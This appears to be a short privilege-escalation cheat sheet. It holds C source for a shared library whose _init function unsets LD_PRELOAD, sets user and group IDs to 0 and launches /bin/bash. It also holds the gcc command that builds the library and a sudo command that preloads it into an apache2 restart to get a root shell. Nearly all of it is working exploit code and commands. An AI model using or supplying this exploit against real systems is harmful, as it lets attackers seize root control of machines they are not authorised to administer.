#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}


gcc -fPIC -shared -o root.so root.c -nostartfiles  
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart  //assuming sudo perm to run apache2 restart  
